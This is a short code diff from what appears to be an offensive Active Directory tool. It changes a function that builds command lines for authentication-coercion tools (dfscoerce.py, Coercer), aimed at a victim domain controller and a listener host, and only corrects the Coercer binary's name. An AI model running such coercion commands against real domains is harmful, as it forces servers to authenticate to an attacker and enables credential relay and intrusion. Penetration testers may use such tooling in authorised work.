@@ -117,8 +117,9 @@ def coercion_trigger_argv(method: str, victim_dc: str, listener_host: str,
     if method == "dfscoerce":
         return ["dfscoerce.py", "-u", user, "-d", domain, *secret,
                 listener_host, victim_dc]
-    # auto -> Coercer multiplexer (scan then coerce every reachable method).
-    return ["Coercer", "coerce", "-u", user, "-d", domain, *secret,
+    # auto -> coercer multiplexer (scan then coerce every reachable method).
+    # Binary is lowercase 'coercer' (the Coercer entry point on Kali/kali-vr).
+    return ["coercer", "coerce", "-u", user, "-d", domain, *secret,
             "-t", victim_dc, "-l", listener_host]
 
 
